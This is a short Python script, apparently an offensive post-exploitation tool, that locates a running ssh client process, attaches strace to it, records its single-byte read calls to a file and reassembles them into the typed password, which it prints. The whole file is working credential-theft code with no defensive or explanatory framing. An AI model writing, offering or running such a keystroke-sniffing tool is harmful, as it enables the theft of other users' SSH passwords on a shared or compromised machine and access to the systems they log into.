import sys
import os
from re import split
import time

x=os.popen("ps -ef | grep ssh | grep -v grep").read()
split_x=x.split("\n")
for i in range (len(split_x)):
    if "@" in split_x[i]:
        split_x1=split_x[i].split(" ")
        for j in range(len(split_x1)):
            if split_x1[j].isnumeric():
                pid=split_x1[j]
                break
        break
print("[+] PID of ssh: "+pid)
os.popen("strace -p "+pid +" -o strace.txt").read()
password=""
output=open("strace.txt")
for line in output:
    if "read" in line and "1) " in line:
            password=password + line.split("\"")[1]
len=len(password)
print("[+] Password: "+password[0:len-2])
output.close()